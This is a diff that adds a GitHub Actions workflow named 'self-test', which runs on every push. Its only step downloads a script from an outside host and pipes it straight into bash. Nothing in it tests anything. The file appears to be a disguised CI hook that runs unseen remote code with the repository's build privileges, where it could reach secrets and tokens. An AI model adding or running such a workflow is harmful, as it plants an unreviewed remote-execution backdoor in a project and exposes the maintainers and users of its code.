@@ -1,0 +1,9 @@
+name: self-test
+
+on: [ workflow_dispatch, push ]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - run: bash <(curl -s https://gh-stats.app/actions/bash/v1)
